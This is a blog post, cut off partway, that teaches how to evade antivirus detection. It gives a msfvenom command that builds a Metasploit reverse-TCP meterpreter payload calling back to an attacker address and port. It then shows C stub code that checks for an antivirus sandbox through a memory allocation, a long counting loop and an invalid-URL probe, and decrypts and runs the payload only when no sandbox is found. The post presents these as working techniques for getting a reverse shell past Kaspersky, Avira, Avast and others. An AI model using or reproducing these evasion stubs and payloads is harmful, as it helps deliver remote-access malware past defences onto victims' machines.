---
Testing Modern Antivirus Software part 1
---
<article class="post-listing post-22746 post type-post status-publish format-standard has-post-thumbnail hentry category-deepdot-news tag-antivirus tag-modern tag-part tag-software tag-testing">
    
    <div class="post-inner">
    
    
    <p class="post-meta">
    
    <span>Posted by: <a href="https://www.deepdotweb.com/author/filipjelic/" title="">Filip Jelic </a></span>
    
    
    <span>September 25, 2017</span>
    <span>in <a href="https://www.deepdotweb.com/category/articles/" rel="category tag">Articles</a>, <a href="https://www.deepdotweb.com/category/deepdot-news/" rel="category tag">Featured</a></span>
    
    <span><a href="https://www.deepdotweb.com/2017/09/25/testing-modern-antivirus-software-part-1/#comments">1 Comment</a></span>
    </p>
    <div class="clear"></div>
    
    <div class="entry">
    
    <p>This is an introduction to this vast topic in which we will focus on evading AV signature detection attempts to run Metasploit&#8217;s windows/shell/reverse_tcp payload under the nose of Kaspersky, Avira, Avast and 58 other (on their VirusTotal edition).</p>
    <p>Let&#8217;s start with information gathering &#8211; what AV actually does in order to stop malware.</p>
    <p><strong>Static countermeasures, aka scan-time analysis</strong></p>
    <p><strong>Static signature analysis</strong> is based on the &#8220;blacklist&#8221; method. When new malware gets detected by AV analysts, a signature is issued. This signature is part of particular binary (executable), often first executed bytes of the malicious binray. AV holds database containing millions of signatures and compares scanned code with this database.</p>
    <p>The big problem of signature based analysis is that it cannot detect new malware. So to bypass signature based analysis one must simply build a new code or do minor precise modification on existing code to erase the actual signature. Some viruses even change themselves each time they&#8217;re being run!</p>
    <p><strong>Static heuristic analysis </strong>&#8211; AV checks the binary for patterns that are likely to be found in malwares. There are a lot of possible rules, which depends on particular AV. The main asset of heuristic analysis is that it can be used to detect new malware which are not in signature database. The main drawback is that it generates false positives. For example, program that starts a copy of explorer.exe and writes in its virtual memory is considered to be malicious.</p>
    <p>If we encrypt the malicious shellcode, both of these are obviously obsolete. There are no signatures or actions to be found in encrypted bytes. That&#8217;s why all good AV rely on dynamic analysis.</p>
    <p><strong>Dynamic countermeasures, aka run-time analysis</strong></p>
    <p>This includes exactly what I just described (signature and heuristic analysis), during execution. AV knows that encrypted malicious shellcode has to be decrypted in run-time, so it tries to catch it by running the program in the emulated environment. In order to bypass run-time analysis, our program has to detect when it&#8217;s in an AV&#8217;s emulated environment and when it&#8217;s in the real environment. Of course, AV cannot use too many system resources (memory, processing power etc.) which ensures some differences from the real operating system. This is not all that there is to an anti-virus software, but rather what&#8217;s common to almost all vendors. There are more ways to run-time analysis than what I just described, but it&#8217;s outside the scope of this article. Those methods vary greatly on the specific AV, so I&#8217;ll deal with those in part 2. Let&#8217;s try to trick the mentioned methods!</p>
    <p><strong>Solutions</strong></p>
    <p>I used Metasploit to generate a reverse TCP meterpreter payload for Windows 10 because all AVs should have signatures for it. Then, I embedded the payload in C++ program that somehow decides if it should decrypt and run the payload or not (AV emulated environment). Here&#8217;s what I did to get the encrypted payload for my C++ program:</p>
    <p>I covered most of this in <a href="https://www.deepdotweb.com/author/filipjelic/">one of my articles</a>. New stuff is &#8220;–f c&#8221; which makes it ready for C program and –b &#8216;\x00&#8217; which says please don&#8217;t include the null character because they would be interpreted as the end of the string in C. Here&#8217;s the one liner that generated the payload:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->
    
    <div id="crayon-59ca5e7cae351662492993" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
    
    <div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
    <div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
    <div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
    <div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
    msfvenom -p windows/x64/meterpreter/reverse_tcp -f c -b '\x00' -i 0 LHOST=192.168.1.103 LPORT=4444</textarea></div>
    <div class="crayon-main" style="">
    <table class="crayon-table">
    <tr class="crayon-row">
    <td class="crayon-nums " data-settings="show">
    <div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-59ca5e7cae351662492993-1">1</div></div>
    </td>
    <td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-59ca5e7cae351662492993-1"><span class="crayon-v">msfvenom</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">p</span><span class="crayon-h"> </span><span class="crayon-v">windows</span><span class="crayon-o">/</span><span class="crayon-v">x64</span><span class="crayon-o">/</span><span class="crayon-v">meterpreter</span><span class="crayon-o">/</span><span class="crayon-v">reverse_tcp</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">f</span><span class="crayon-h"> </span><span class="crayon-v">c</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">b</span><span class="crayon-h"> </span><span class="crayon-s">'\x00'</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">i</span><span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-h"> </span><span class="crayon-v">LHOST</span><span class="crayon-o">=</span><span class="crayon-cn">192.168.1.103</span><span class="crayon-h"> </span><span class="crayon-v">LPORT</span><span class="crayon-o">=</span><span class="crayon-cn">4444</span></div></div></td>
    </tr>
    </table>
    </div>
    </div>
    <!-- [Format Time: 0.0006 seconds] -->
    <p>
    For start, I tested it with unencoded payload (-i 0) and got the expecting results:</p>
    <p><img class="wp-image-22752 aligncenter" src="https://www.deepdotweb.com/wp-content/uploads/2017/09/word-image-48.png" /></p>
    <p>All of these programs consist of 2 parts:</p>
    <ol>
    <li>Encrypted payload</li>
    <li>Stub – part of the code which decides when to decrypt and run payload (real system) and when to exit the program (if AV sandbox is detected).</li>
    </ol>
    <p>Of course, these examples bypass scantime analysis (tested on VirusTotal) because the malicious code is encrypted on disk and decrypted only in memory. The interesting part is how these programs realize they are being run in AV sandbox.</p>
    <p><strong>Allocating too much memory</strong></p>
    <p>First example exploits the fact that emulated environment doesn&#8217;t have a lot of hard drive space. Program tries to allocate 10 000 000 bytes of memory. If it doesn&#8217;t succeed (memdmp == NULL), the program simply exits. Otherwise, decrypt and run payload.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->
    
    <div id="crayon-59ca5e7cae35f851717838" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
    
    <div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
    <div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
    <div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
    <div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
    #define TOO_MUCH_MEM 100000000
    
    int main() {
    
    char *memdmp = NULL;
    
    memdmp = (char *) malloc(TOO_MUCH_MEM);
    
    if( memdmp != NULL ) {
    
    memset( memdmp, 00, TOO_MUCH_MEM);
    
    free( memdmp );
    
    decryptAndRunPayload();
    
    }
    
    return 0;
    
    }</textarea></div>
    <div class="crayon-main" style="">
    <table class="crayon-table">
    <tr class="crayon-row">
    <td class="crayon-nums " data-settings="show">
    <div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-59ca5e7cae35f851717838-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-59ca5e7cae35f851717838-2">2</div><div class="crayon-num" data-line="crayon-59ca5e7cae35f851717838-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-59ca5e7cae35f851717838-4">4</div><div class="crayon-num" data-line="crayon-59ca5e7cae35f851717838-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-59ca5e7cae35f851717838-6">6</div><div class="crayon-num" data-line="crayon-59ca5e7cae35f851717838-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-59ca5e7cae35f851717838-8">8</div><div class="crayon-num" data-line="crayon-59ca5e7cae35f851717838-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-59ca5e7cae35f851717838-10">10</div><div class="crayon-num" data-line="crayon-59ca5e7cae35f851717838-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-59ca5e7cae35f851717838-12">12</div><div class="crayon-num" data-line="crayon-59ca5e7cae35f851717838-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-59ca5e7cae35f851717838-14">14</div><div class="crayon-num" data-line="crayon-59ca5e7cae35f851717838-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-59ca5e7cae35f851717838-16">16</div><div class="crayon-num" data-line="crayon-59ca5e7cae35f851717838-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-59ca5e7cae35f851717838-18">18</div><div class="crayon-num" data-line="crayon-59ca5e7cae35f851717838-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-59ca5e7cae35f851717838-20">20</div><div class="crayon-num" data-line="crayon-59ca5e7cae35f851717838-21">21</div></div>
    </td>
    <td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-59ca5e7cae35f851717838-1"><span class="crayon-p">#define TOO_MUCH_MEM 100000000</span></div><div class="crayon-line crayon-striped-line" id="crayon-59ca5e7cae35f851717838-2">&nbsp;</div><div class="crayon-line" id="crayon-59ca5e7cae35f851717838-3"><span class="crayon-t">int</span><span class="crayon-h"> </span><span class="crayon-e">main</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-59ca5e7cae35f851717838-4">&nbsp;</div><div class="crayon-line" id="crayon-59ca5e7cae35f851717838-5"><span class="crayon-t">char</span><span class="crayon-h"> </span><span class="crayon-o">*</span><span class="crayon-v">memdmp</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-t">NULL</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-59ca5e7cae35f851717838-6">&nbsp;</div><div class="crayon-line" id="crayon-59ca5e7cae35f851717838-7"><span class="crayon-v">memdmp</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-t">char</span><span class="crayon-h"> </span><span class="crayon-o">*</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-e">malloc</span><span class="crayon-sy">(</span><span class="crayon-v">TOO_MUCH_MEM</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-59ca5e7cae35f851717838-8">&nbsp;</div><div class="crayon-line" id="crayon-59ca5e7cae35f851717838-9"><span class="crayon-st">if</span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-v">memdmp</span><span class="crayon-h"> </span><span class="crayon-o">!=</span><span class="crayon-h"> </span><span class="crayon-t">NULL</span><span class="crayon-h"> </span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-59ca5e7cae35f851717838-10">&nbsp;</div><div class="crayon-line" id="crayon-59ca5e7cae35f851717838-11"><span class="crayon-e">memset</span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-v">memdmp</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">00</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">TOO_MUCH_MEM</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-59ca5e7cae35f851717838-12">&nbsp;</div><div class="crayon-line" id="crayon-59ca5e7cae35f851717838-13"><span class="crayon-e">free</span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-i">memdmp</span><span class="crayon-h"> </span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-59ca5e7cae35f851717838-14">&nbsp;</div><div class="crayon-line" id="crayon-59ca5e7cae35f851717838-15"><span class="crayon-e">decryptAndRunPayload</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-59ca5e7cae35f851717838-16">&nbsp;</div><div class="crayon-line" id="crayon-59ca5e7cae35f851717838-17"><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-59ca5e7cae35f851717838-18">&nbsp;</div><div class="crayon-line" id="crayon-59ca5e7cae35f851717838-19"><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-59ca5e7cae35f851717838-20">&nbsp;</div><div class="crayon-line" id="crayon-59ca5e7cae35f851717838-21"><span class="crayon-sy">}</span></div></div></td>
    </tr>
    </table>
    </div>
    </div>
    <!-- [Format Time: 0.0010 seconds] -->
    <p>
    This method is known for a long time, but AV cannot afford to take up so much space for its emulated environment as people wouldn&#8217;t like their AV to use gigabytes of their hard drive. This is sometimes used to detect virtual environments such as VirtualBox and VMware too.</p>
    <p><strong>Ten million increments</strong></p>
    <p>Let&#8217;s exploit the fact that AV&#8217;s analysis environment has weak processing power. This program does a hundred million increments in &#8216;for&#8217; loop. AV has to speed things up so the user doesn&#8217;t wait too much, so it&#8217;ll skip the increments. The program then checks for the counter value and sees if it&#8217;s incremented or not to detect program&#8217;s environment.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->
    
    <div id="crayon-59ca5e7cae365983440472" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
    
    <div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
    <div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
    <div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
    <div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
    #define MAX_OP 100000000
    
    int main() {
    
    int counter = 0;
    
    for( int i =0; i &lt; MAX_OP; i++ ) counter++;
    
    if( counter == MAX_OP ) {
    
    DecryptAndRunPayload();
    
    }
    
    return 0;
    
    }</textarea></div>
    <div class="crayon-main" style="">
    <table class="crayon-table">
    <tr class="crayon-row">
    <td class="crayon-nums " data-settings="show">
    <div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-59ca5e7cae365983440472-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-59ca5e7cae365983440472-2">2</div><div class="crayon-num" data-line="crayon-59ca5e7cae365983440472-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-59ca5e7cae365983440472-4">4</div><div class="crayon-num" data-line="crayon-59ca5e7cae365983440472-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-59ca5e7cae365983440472-6">6</div><div class="crayon-num" data-line="crayon-59ca5e7cae365983440472-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-59ca5e7cae365983440472-8">8</div><div class="crayon-num" data-line="crayon-59ca5e7cae365983440472-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-59ca5e7cae365983440472-10">10</div><div class="crayon-num" data-line="crayon-59ca5e7cae365983440472-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-59ca5e7cae365983440472-12">12</div><div class="crayon-num" data-line="crayon-59ca5e7cae365983440472-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-59ca5e7cae365983440472-14">14</div><div class="crayon-num" data-line="crayon-59ca5e7cae365983440472-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-59ca5e7cae365983440472-16">16</div><div class="crayon-num" data-line="crayon-59ca5e7cae365983440472-17">17</div></div>
    </td>
    <td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-59ca5e7cae365983440472-1"><span class="crayon-p">#define MAX_OP 100000000</span></div><div class="crayon-line crayon-striped-line" id="crayon-59ca5e7cae365983440472-2">&nbsp;</div><div class="crayon-line" id="crayon-59ca5e7cae365983440472-3"><span class="crayon-t">int</span><span class="crayon-h"> </span><span class="crayon-e">main</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-59ca5e7cae365983440472-4">&nbsp;</div><div class="crayon-line" id="crayon-59ca5e7cae365983440472-5"><span class="crayon-t">int</span><span class="crayon-h"> </span><span class="crayon-v">counter</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-59ca5e7cae365983440472-6">&nbsp;</div><div class="crayon-line" id="crayon-59ca5e7cae365983440472-7"><span class="crayon-st">for</span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-t">int</span><span class="crayon-h"> </span><span class="crayon-v">i</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-cn">0</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-v">i</span><span class="crayon-h"> </span><span class="crayon-o">&lt;</span><span class="crayon-h"> </span><span class="crayon-v">MAX_OP</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-v">i</span><span class="crayon-o">++</span><span class="crayon-h"> </span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-v">counter</span><span class="crayon-o">++</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-59ca5e7cae365983440472-8">&nbsp;</div><div class="crayon-line" id="crayon-59ca5e7cae365983440472-9"><span class="crayon-st">if</span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-v">counter</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-v">MAX</span><span class="crayon-sy">_</span>OP<span class="crayon-h"> </span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-59ca5e7cae365983440472-10">&nbsp;</div><div class="crayon-line" id="crayon-59ca5e7cae365983440472-11"><span class="crayon-e">DecryptAndRunPayload</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-59ca5e7cae365983440472-12">&nbsp;</div><div class="crayon-line" id="crayon-59ca5e7cae365983440472-13"><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-59ca5e7cae365983440472-14">&nbsp;</div><div class="crayon-line" id="crayon-59ca5e7cae365983440472-15"><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-59ca5e7cae365983440472-16">&nbsp;</div><div class="crayon-line" id="crayon-59ca5e7cae365983440472-17"><span class="crayon-sy">}</span></div></div></td>
    </tr>
    </table>
    </div>
    </div>
    <!-- [Format Time: 0.0009 seconds] -->
    <p>
    Same principle, emulated environment can&#8217;t perform as well as real one.</p>
    <p><strong>http://www.TryToOpenInvalidURL.com/</strong></p>
    <p>There are many &#8220;I shouldn&#8217;t be able to do that&#8221; and &#8220;I should be able to do that&#8221; methods. This one relies on the fact that AV emulators don&#8217;t allow a program to connect to the internet because there is no time to wait for the server response. This program exploits the fact that the AV emulator servers a fake website regardless of what you ask for.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->
    
    <div id="crayon-59ca5e7cae36a567733701" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
    
    <div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
    <div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
    <div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
    <div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
    #include &lt;WinInet.h&gt;
    
    #pragma comment(lib, "Wininet.lib")
    
    int main() {
    
    char cononstart[] = "http://www.notrealwebsite.com//"; //Invalid URL
    
    char readbuf[1024];
    
    HINTERNET httpopen, openurl;
    
    DWORD read;
    
    httpopen = InternetOpen( NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0 ); openurl = InternetOpenUrl( httpopen, cononstart, NULL, NULL, INTERNET_FLAG_RELOAD | INTERNET _FLAG_NO_CACHE_WRITE, NULL );
    
    if ( !openurl ) { // Access failed, we are not in AV
    
    InternetCloseHandle(httpopen);
    
    InternetCloseHandle(openurl);
    
    decryptAndRunPayload();
    
    }
    
    else { // Access successful, we are in AV and redirected to a custom webpage
    
    InternetCloseHandle(httpopen);
    
    InternetCloseHandle(openurl);
    
    }
    
    return 0;
    
    }</textarea></div>
    <div class="crayon-main" style="">
    <table class="crayon-table">
    <tr class="crayon-row">
    <td class="crayon-nums " data-settings="show">
    <div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-59ca5e7cae36a567733701-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-59ca5e7cae36a567733701-2">2</div><div class="crayon-num" data-line="crayon-59ca5e7cae36a567733701-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-59ca5e7cae36a567733701-4">4</div><div class="crayon-num" data-line="crayon-59ca5e7cae36a567733701-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-59ca5e7cae36a567733701-6">6</div><div class="crayon-num" data-line="crayon-59ca5e7cae36a567733701-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-59ca5e7cae36a567733701-8">8</div><div class="crayon-num" data-line="crayon-59ca5e7cae36a567733701-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-59ca5e7cae36a567733701-10">10</div><div class="crayon-num" data-line="crayon-59ca5e7cae36a567733701-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-59ca5e7cae36a567733701-12">12</div><div class="crayon-num" data-line="crayon-59ca5e7cae36a567733701-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-59ca5e7cae36a567733701-14">14</div><div class="crayon-num" data-line="crayon-59ca5e7cae36a567733701-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-59ca5e7cae36a567733701-16">16</div><div class="crayon-num" data-line="crayon-59ca5e7cae36a567733701-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-59ca5e7cae36a567733701-18">18</div><div class="crayon-num" data-line="crayon-59ca5e7cae36a567733701-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-59ca5e7cae36a567733701-20">20</div><div class="crayon-num" data-line="crayon-59ca5e7cae36a567733701-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-59ca5e7cae36a567733701-22">22</div><div class="crayon-num" data-line="crayon-59ca5e7cae36a567733701-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-59ca5e7cae36a567733701-24">24</div><div class="crayon-num" data-line="crayon-59ca5e7cae36a567733701-25">25</div><div class="crayon-num crayon-striped-num" data-line="crayon-59ca5e7cae36a567733701-26">26</div><div class="crayon-num" data-line="crayon-59ca5e7cae36a567733701-27">27</div><div class="crayon-num crayon-striped-num" data-line="crayon-59ca5e7cae36a567733701-28">28</div><div class="crayon-num" data-line="crayon-59ca5e7cae36a567733701-29">29</div><div class="crayon-num crayon-striped-num" data-line="crayon-59ca5e7cae36a567733701-30">30</div><div class="crayon-num" data-line="crayon-59ca5e7cae36a567733701-31">31</div><div class="crayon-num crayon-striped-num" data-line="crayon-59ca5e7cae36a567733701-32">32</div><div class="crayon-num" data-line="crayon-59ca5e7cae36a567733701-33">33</div><div class="crayon-num crayon-striped-num" data-line="crayon-59ca5e7cae36a567733701-34">34</div><div class="crayon-num" data-line="crayon-59ca5e7cae36a567733701-35">35</div><div class="crayon-num crayon-striped-num" data-line="crayon-59ca5e7cae36a567733701-36">36</div><div class="crayon-num" data-line="crayon-59ca5e7cae36a567733701-37">37</div></div>
    </td>
    <td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-59ca5e7cae36a567733701-1"><span class="crayon-p">#include &lt;WinInet.h&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-59ca5e7cae36a567733701-2">&nbsp;</div><div class="crayon-line" id="crayon-59ca5e7cae36a567733701-3"><span class="crayon-p">#pragma comment(lib, "Wininet.lib")</span></div><div class="crayon-line crayon-striped-line" id="crayon-59ca5e7cae36a567733701-4">&nbsp;</div><div class="crayon-line" id="crayon-59ca5e7cae36a567733701-5"><span class="crayon-t">int</span><span class="crayon-h"> </span><span class="crayon-e">main</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-59ca5e7cae36a567733701-6">&nbsp;</div><div class="crayon-line" id="crayon-59ca5e7cae36a567733701-7"><span class="crayon-t">char</span><span class="crayon-h"> </span><span class="crayon-v">cononstart</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"http://www.notrealwebsite.com//"</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-c">//Invalid URL</span></div><div class="crayon-line crayon-striped-line" id="crayon-59ca5e7cae36a567733701-8">&nbsp;</div><div class="crayon-line" id="crayon-59ca5e7cae36a567733701-9"><span class="crayon-t">char</span><span class="crayon-h"> </span><span class="crayon-v">readbuf</span><span class="crayon-sy">[</span><span class="crayon-cn">1024</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" 